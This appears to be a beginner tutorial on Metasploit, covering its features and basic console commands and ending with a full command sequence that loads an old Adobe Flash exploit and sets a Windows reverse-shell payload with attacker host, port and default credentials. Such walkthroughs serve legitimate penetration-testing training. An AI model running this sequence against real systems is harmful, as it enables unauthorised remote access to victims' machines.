  • POST-EXPLOITATING


    • Metasploit Basics

    Metasploit is a penetration testing tool and is often listed as the world’s most widely used pen-testing tool. There is a free version but with limited features. The pro version starts at $5,000 with full features starting at $15,000 per year. In simple terms, Metasploit makes hacking easier. It offers a command-line interface, but the GUI-based version is available in the Pro version. It offers a PS Exec feature that can kill a process from another computer to one that is frozen. It integrates with Nmap, SNMP scanning, and Windows patch enumeration and most reconnaissance tools integrate with Metasploit. Metasploit includes a massive database with exploits that will work to crack open a system weakness. It also has tools that help with privilege escalation, pass the hash, pivoting tools, packet sniffing, keyloggers, and screen capture among many more features. Metasploit can also be modified to the user's needs. It is a total package solution.

    How to use Metasploit

    Show

    The Show command can be used to see items within a module.

    For example:

  • msf > show auxiliary

    • The above command will show the available auxiliary modules.

    Loading a Module

    Example:

  • msf > use priv

    • The above command will use the priv module.

    Setting Options

    Example:

  • msf > set [option] [Value]
  • msf > show options

    • In the two above commands, the first command is used to set options and the second can be used to see what options are available in the current module.

    Executing an Exploit

    The exploit must first be loaded, for example:

  • msf > use exploit/windows/browser/adobe_flash_avm2

    • The above command sets the exploit to be used to a vulnerability found in an older version of Adobe Flash. The vulnerability has been patched; however, if a patch has not been applied, it could be used to exploit the target system.

    To see information about the vulnerability the below command can be used:

  • msf exploit(adobe_flash_avm2) > info

    • Help command within and exploit will give a list of available commands:

  • msf exploit(adobe_flash_avm2) > help

    • Loading the exploit does nothing to the target. A payload must be used to exploit the vulnerability. To see the available payloads, use this command:

  • msf exploit(adobe_flash_avm2) > show payloads

    • After reviewing the payloads and finding the right one, use this command:

  • msf exploit(adobe_flash_avm2) > set PAYLOAD [copy and paste the payload from the payload list]

    • Example:

  • msf exploit(adobe_flash_avm2) > set PAYLOAD windows/shell/reverse_tcp

    • The credentials of the target must also be set. The entire command settings to make the exploit happen may look like this example:

      1. msf > use exploit/windows/browser/adobe_flash_avm2
      2. msf exploit(adobe_flash_avm2) > set RHOST 192.168.1.100
      3. msf exploit(adobe_flash_avm2) > set PAYLOAD windows/shell/reverse_tcp
      4. msf exploit(adobe_flash_avm2) > set LHOST 192.168.1.4
      5. msf exploit(adobe_flash_avm2) > set LPORT 4444
      6. msf exploit(adobe_flash_avm2) > set SMBUSER Admin
      7. msf exploit(adobe_flash_avm2) > set SMBPASS Admin
      8. msf exploit(adobe_flash_avm2) > exploit

    The previous commands do the following:

      1. Selects the exploit to use
      2. Sets the remote host IP
      3. Sets the payload
      4. Sets the local host IP
      5. Sets the port number
      6. Sets the username
      7. Sets the users password
      8. Executes the commands
